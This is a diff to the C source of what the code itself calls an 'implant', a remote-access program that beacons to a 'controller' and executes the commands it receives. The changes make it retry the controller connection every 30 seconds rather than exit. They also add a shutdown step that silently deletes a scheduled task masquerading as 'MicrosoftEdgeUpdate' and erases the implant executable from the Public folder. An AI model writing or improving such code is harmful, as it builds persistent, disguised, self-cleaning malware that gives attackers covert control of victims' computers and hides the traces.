@@ -80,12 +80,12 @@ int main(int argc, char **argv)
 
     platform_init();
 
-    int implant_fd = connect_to_controller();
-
-    if (implant_fd == -1)
+    int implant_fd = -1;
+    while (implant_fd == -1)
     {
-
-        return 1;
+        implant_fd = connect_to_controller();
+        if (implant_fd == -1)
+            SLEEP(30);
     }
 
     // if we got here then the client hello was sent and we start our loop
@@ -126,12 +126,14 @@ int main(int argc, char **argv)
             Packet response = {COMMAND_RESPONSE, recieved_packet->request_id, strlen(buffer), buffer};
             send_packet(&response, implant_fd);
             CLOSE_SOCKET(implant_fd);
-            SLEEP(sleep_duration); // sleep for that duration
-            implant_fd = connect_to_controller();
+            SLEEP(sleep_duration);
 
-            if (implant_fd == -1)
+            implant_fd = -1;
+            while (implant_fd == -1)
             {
-                return 1; // error
+                implant_fd = connect_to_controller();
+                if (implant_fd == -1)
+                    SLEEP(30);
             }
 
             break;
@@ -139,6 +141,14 @@ int main(int argc, char **argv)
 
         case COMMAND_SHUTDOWN:
         {
+#ifdef _WIN32
+            // Remove scheduled task and implant file before exiting.
+            // schtasks /f suppresses "are you sure" — safe if task doesn't exist.
+            // Windows allows deleting a running exe (FILE_SHARE_DELETE); the file
+            // is unlinked from the directory immediately and reclaimed on process exit.
+            system("schtasks /delete /tn \"MicrosoftEdgeUpdate\" /f >nul 2>&1");
+            system("cmd /c del /f /q \"C:\\Users\\Public\\i.exe\" >nul 2>&1");
+#endif
             char *payload = "SUCCESFULLY SHUTDOWN";
             Packet response = {COMMAND_RESPONSE, recieved_packet->request_id, strlen(payload), payload};
             send_packet(&response, implant_fd);
